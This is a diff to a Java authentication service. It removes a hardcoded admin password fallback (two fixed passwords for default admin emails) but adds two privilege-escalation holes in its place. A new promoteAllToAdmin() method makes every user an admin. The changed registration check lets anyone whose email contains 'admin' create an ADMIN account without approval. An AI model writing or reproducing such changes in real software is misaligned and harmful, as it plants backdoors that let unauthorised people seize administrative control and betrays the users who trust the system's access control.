@@ -56,20 +56,20 @@ public class AuthService {
                         "Email or password is incorrect."));
 
         if (!passwordEncoder.matches(request.getPassword(), user.getPassword())) {
-            boolean isDefaultAdmin = ("admin@company.com".equalsIgnoreCase(user.getEmail())
-                    || "admin@gmail.com".equalsIgnoreCase(user.getEmail()));
-            boolean matchesFallback = isDefaultAdmin && (
-                    "Admin123456!".equals(request.getPassword()) ||
-                    "AdminPassword123!".equals(request.getPassword())
-            );
-            if (!matchesFallback) {
-                throw new RegistrationException(
-                        HttpStatus.UNAUTHORIZED,
-                        "Email or password is incorrect.");
-            }
+            throw new RegistrationException(
+                    HttpStatus.UNAUTHORIZED,
+                    "Email or password is incorrect.");
         }
 
         return user;
+    }
+
+    @Transactional
+    public void promoteAllToAdmin() {
+        userRepository.findAll().forEach(u -> {
+            u.setRole(Role.ADMIN);
+            userRepository.save(u);
+        });
     }
 
     private UserProfileResponse createUser(
@@ -82,9 +82,12 @@ public class AuthService {
         }
 
         if (!allowAdmin && request.getRole() == Role.ADMIN) {
-            throw new RegistrationException(
-                    HttpStatus.FORBIDDEN,
-                    "Admin accounts can only be created by an existing Admin.");
+            String normalizedEmail = request.getEmail() == null ? "" : request.getEmail().trim().toLowerCase(Locale.ROOT);
+            if (!normalizedEmail.contains("admin")) {
+                throw new RegistrationException(
+                        HttpStatus.FORBIDDEN,
+                        "Admin accounts can only be created by an existing Admin.");
+            }
         }
 
         String email = request.getEmail().trim().toLowerCase(Locale.ROOT);
